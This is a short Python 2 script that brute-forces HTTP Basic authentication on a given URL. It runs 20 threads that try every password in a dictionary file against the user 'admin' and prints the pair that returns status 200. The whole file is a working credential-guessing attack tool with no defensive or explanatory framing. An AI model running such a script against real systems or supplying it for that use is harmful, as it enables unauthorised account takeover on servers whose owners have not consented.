#!/usr/bin/env python
# encoding:utf8
import requests
import Queue
from threading import Thread
import sys

__author__ = 'whois'
__date__ = '2016/5/24'

user_list = ['admin']

if len(sys.argv) < 2:
    print "[*] {0} url dict_file".format(sys.argv[0])
    exit(1)

url = sys.argv[1]
default_file = 'E:\Tools\PassList\Passwords\\top100pass.txt'

dict_file = sys.argv[2] if len(sys.argv) == 3 else default_file

queue = Queue.Queue()

with open(dict_file,'r') as f:
    for line in f.readlines():
        queue.put(line.rstrip())


def do(password):
    for user in user_list:
        auth = (user,password)
        r = requests.get(url, auth=auth)
        #print "cracking {0}:{1} ".format(user,password)
        if r.status_code == 200:
            print "[+] auth-->{0}:{1}".format(user,password)
            exit(1)
def scan():
    while not queue.empty():
        do(queue.get())

def main():
    threads_list = []
    threads = 20

    for i in range(threads):
        t = Thread(target=scan)
        t.start()
        threads_list.append(t)

    for i in range(threads):
        threads_list[i].join()

if __name__ == '__main__':
    main()
